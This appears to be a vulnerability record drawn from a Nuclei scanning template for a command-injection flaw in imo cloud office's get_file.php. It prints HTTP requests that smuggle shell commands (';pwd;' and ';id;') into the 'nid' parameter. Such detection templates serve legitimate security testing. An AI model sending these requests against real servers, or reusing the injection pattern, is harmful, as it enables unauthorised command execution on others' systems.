# Vulnerability: IMO - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`imo-rce.yaml`)

## Description
The lax filtering of imo cloud office/file/NDisk/get_file.php allows unlimited file uploads. Attackers can directly obtain website permissions through this vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /file/NDisk/get_file.php?cid=1&nid=;pwd; HTTP/1.1
Host: {{Hostname}}

GET /file/NDisk/get_file.php?cid=1&nid=;id; HTTP/1.1
Host: {{Hostname}}
```

